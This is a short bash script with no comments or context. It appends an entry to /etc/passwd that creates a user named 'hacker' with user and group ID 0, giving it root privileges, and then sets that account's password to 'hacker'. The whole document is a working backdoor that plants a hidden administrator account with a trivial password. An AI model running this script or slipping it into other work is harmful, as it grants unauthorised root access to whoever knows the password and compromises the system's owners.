#!/usr/bin/env bash

echo 'hacker:x:0:0:hacker,,,:/home/hacker:/bin/bash' | sudo tee -a /etc/passwd
echo "hacker:hacker" | chpasswd